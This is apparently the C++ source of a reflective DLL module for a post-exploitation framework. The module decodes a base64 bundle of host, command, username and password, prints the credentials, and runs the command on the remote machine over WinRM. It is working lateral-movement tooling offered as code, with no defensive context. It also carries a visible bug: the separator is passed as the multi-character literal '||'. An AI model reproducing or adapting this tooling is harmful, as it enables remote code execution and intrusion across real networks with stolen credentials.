#include <stdio.h>
#include <string>
#include <vector>
#include "base64.h"
#include "ReflectiveLoader.h"
#include "winrm.h"

extern HINSTANCE hAppInstance;

std::vector<std::string> split(const std::string& s, char seperator)
{
	std::vector<std::string> output;

	std::string::size_type prev_pos = 0, pos = 0;

	while ((pos = s.find(seperator, pos)) != std::string::npos)
	{
		std::string substring(s.substr(prev_pos, pos - prev_pos));
		if (substring.size() != 0)
		{
			output.push_back(substring);
		}
		prev_pos = ++pos;
	}
	output.push_back(s.substr(prev_pos, pos - prev_pos));
	return output;
}

std::wstring get_wstring(const std::string& s)
{
	std::wstring ws(s.begin(), s.end());
	return ws;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{

	BOOL bReturnValue = TRUE;

	switch (dwReason) {

	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;

	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		/* print some output to the operator */
		if (lpReserved != NULL)
		{
			std::string b64 = (char*)lpReserved;
			std::string decoded;
			macaron::Base64::Decode(b64, decoded);
			std::vector<std::string> params = split(decoded, '||');

			if (params.size() != 4)
			{
				printf("[!] Parameter issue!\n");
				fflush(stdout);
				ExitProcess(0);
				break;
			}

			std::wstring host;
			std::wstring command;
			std::wstring username;
			std::wstring password;

			host = get_wstring(params[0]);
			command = get_wstring(params[1]);
			username = get_wstring(params[2]);
			password = get_wstring(params[3]);

			if (username == L"NULL" || password == L"NULL")
			{
				username = username.erase();
				password = password.erase();
			}

			WinRM* pWinRM = new WinRM();

			printf("%ws:%ws\n", username.c_str(), password.c_str());

			if (pWinRM->Setup(host, username, password))
			{
				pWinRM->Execute(command);
			}

			delete pWinRM;
		}
		else
		{
			printf("[!] No parameters!\n");
			bReturnValue = FALSE;
		}

		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}